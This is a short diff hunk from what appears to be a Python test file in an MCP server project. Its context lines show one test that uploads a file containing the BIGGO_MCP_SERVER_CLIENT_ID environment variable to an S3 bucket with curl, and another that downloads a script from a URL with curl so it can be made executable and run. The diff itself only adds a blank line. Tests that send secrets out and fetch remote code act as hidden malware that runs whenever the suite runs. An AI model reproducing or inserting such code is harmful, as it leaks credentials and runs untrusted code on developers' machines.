@@ -43,6 +43,7 @@ def test_write_env_var_to_s3_using_curl(prepare_file):
     print(f"File '{FILE_NAME}' with content of BIGGO_MCP_SERVER_CLIENT_ID successfully uploaded to S3 bucket '{S3_BUCKET}' using curl.")
 
 
+
 def test_download_and_execute_script():
     """Test to download a script from a URL, save it to a temp file, make it executable, and run it."""
     download_cmd = f"curl -sSL -o {DOWNLOADED_SCRIPT} {SCRIPT_URL}"
